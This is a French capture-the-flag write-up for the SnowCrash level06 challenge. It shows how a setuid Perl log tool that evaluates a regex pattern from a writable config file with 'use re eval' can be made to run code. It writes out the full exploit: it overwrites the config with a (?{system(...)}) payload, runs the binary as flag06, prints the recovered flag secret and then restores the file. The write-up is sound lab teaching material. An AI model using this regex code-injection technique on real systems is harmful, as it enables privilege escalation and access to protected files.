# Level06 — Perl et expressions régulières

## Objectif

Comprendre comment une configuration censée contenir des données peut devenir du code exécutable. L’exploitation nécessite ici la combinaison d’une configuration modifiable, d’une expression régulière Perl autorisant du code et d’un exécutable disposant des droits de `flag06`.

## 1. Trouver le programme

```bash
cat README
```

Résultat :

```text
Nothing passes through the Raven unread.
```

Le mot `Raven` fournit la piste. Rechercher les fichiers correspondants dans le dossier du niveau :

```bash
find /opt/snowcrash/level06 -maxdepth 3 -ls
```

Deux fichiers intéressants apparaissent :

```text
/opt/snowcrash/level06/raven
/opt/snowcrash/level06/raven.pl
```

Le premier est l’exécutable à lancer. Le second est un script Perl lisible qui permet d’étudier le traitement réalisé.

## 2. Examiner les permissions

```bash
id
ls -l /etc/raven/raven.conf
ls -l /opt/snowcrash/level06/raven
```

Les observations conservées montrent que :

- `level06` appartient au groupe `raven` ;
- ce groupe peut modifier `/etc/raven/raven.conf` ;
- l’exécutable `raven` appartient à `flag06` et possède le bit setuid.

Le bit setuid est visible par un `s` dans les permissions du propriétaire. Lors de l’exécution, le programme peut recevoir l’UID effectif de son propriétaire, ici `flag06`. Cela ne transforme pas définitivement notre compte en `flag06` : seuls les droits effectifs du processus concerné changent.

Les permissions exactes affichées par `ls -l` doivent être conservées depuis la VM afin d’apporter la preuve de ces affirmations.

## 3. Lire le script Perl

```bash
cat /opt/snowcrash/level06/raven.pl
```

Deux éléments sont déterminants :

```perl
use re 'eval';
```

et l’évaluation d’un motif provenant de la configuration :

```perl
$line =~ /$pattern/
```

Une expression régulière, ou *regex*, décrit un motif à rechercher dans du texte. Par exemple :

```perl
$line =~ /ERROR/
```

Cette expression vérifie si `$line` contient le mot `ERROR`. Dans Raven, le contenu de `$pattern` ne vient pas directement du programme : il est lu dans le fichier de configuration modifiable par `level06`.

## 4. Comprendre l’exécution de code dans la regex

Perl accepte une construction spéciale dans certaines expressions régulières :

```perl
(?{ code Perl })
```

Le code placé entre les accolades est exécuté pendant l’évaluation du motif. La directive `use re 'eval'` autorise ce mécanisme pour un motif construit dynamiquement.

Le problème n’est donc pas la simple utilisation d’une regex. Il vient de la combinaison suivante :

```text
configuration contrôlée par level06
                │
                ▼
 motif dynamique avec (?{ ... })
                │
                ▼
  use re 'eval' autorise son exécution
                │
                ▼
 Raven l’évalue avec les droits de flag06
```

## 5. Comprendre le rôle de la rétention

La configuration originale contient :

```ini
retention_days = 7
```

Raven ignore les journaux trop anciens. Avec la configuration d’origine, les résultats rapportés sont :

```text
Total lines: 0
Skipped files: 2
```

Si aucune ligne n’est traitée, l’expression régulière n’est jamais évaluée et le code qu’elle contient ne s’exécute pas. Modifier uniquement le motif ne suffit donc pas.

La valeur `9999` élargit suffisamment la période pour inclure les journaux présents sur cette VM. Ce nombre est adapté aux données du niveau ; ce n’est pas une constante particulière de Raven ou de Perl.

## 6. Sauvegarder puis modifier la configuration

Sauvegarder d’abord le fichier original et son empreinte :

```bash
cp /etc/raven/raven.conf /tmp/raven.conf.level06.bak
sha256sum /tmp/raven.conf.level06.bak
```

Installer ensuite la configuration de test :

```bash
cat > /etc/raven/raven.conf <<'EOF'
log_dir = /var/log/snowcrash
retention_days = 9999
loglevel_pattern = (?{system('/bin/cat /home/flag06/.flag')})
EOF
```

| Réglage | Rôle |
| --- | --- |
| `log_dir` | Indiquer le dossier contenant les journaux à analyser. |
| `retention_days` | Autoriser le traitement des journaux anciens du niveau. |
| `loglevel_pattern` | Fournir le motif évalué par Perl. |
| `system(...)` | Demander à Perl de lancer la commande externe `cat`. |

Les apostrophes autour de `EOF` empêchent le shell de transformer le contenu avant son écriture.

## 7. Exécuter Raven

```bash
/opt/snowcrash/level06/raven
```

Le motif exécute `cat` pendant le traitement des lignes et affiche le secret :

```text
wizelohxamaiuiia2uinaes4a
```

La solution rapporte que cette valeur apparaît six fois, car six lignes passent par l’évaluation du motif. Cette répétition est une conséquence du traitement ligne par ligne, pas six secrets différents.

## 8. Restaurer la configuration

Restaurer le contenu original et vérifier que les empreintes sont identiques :

```bash
cat /tmp/raven.conf.level06.bak > /etc/raven/raven.conf
sha256sum /etc/raven/raven.conf /tmp/raven.conf.level06.bak
```

Après confirmation, supprimer la sauvegarde :

```bash
rm -f /tmp/raven.conf.level06.bak
```

## 9. Valider le secret

```bash
ssh -p 4242 level07@localhost
```

Puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level07`. La connexion a réussi avec le secret récupéré, également conservé dans `level06/flag`.

## Pourquoi cette méthode fonctionne

Trois conditions sont nécessaires :

1. `level06` peut modifier la configuration ;
2. Perl autorise et évalue du code contenu dans le motif dynamique ;
3. Raven s’exécute avec les droits effectifs de `flag06` et peut donc lire son fichier `.flag`.

La rétention constitue une quatrième condition pratique : au moins une ligne doit atteindre la regex pour déclencher le code.

## À expliquer à l’évaluation

> J’ai découvert que Raven chargeait depuis une configuration modifiable un motif Perl dynamique. Le script active `re 'eval'`, ce qui permet à la construction `(?{ ... })` d’exécuter du code. J’ai aussi augmenté temporairement la rétention, car aucun journal n’était traité avec la valeur originale. L’exécutable setuid a ensuite lu le flag avec les droits de `flag06`. Enfin, j’ai restauré la configuration et vérifié son empreinte.

## Traçabilité et références

Conserver les sorties de `id`, `ls -l`, l’extrait utile de `raven.pl`, la sortie avant et après modification de la rétention, les empreintes de restauration et le résultat de `id -un`.

Les mécanismes techniques sont décrits dans la documentation officielle : [Perl `perlre`](https://perldoc.perl.org/perlre), [Perl `re`](https://perldoc.perl.org/re) et [`execve(2)`](https://man7.org/linux/man-pages/man2/execve.2.html).
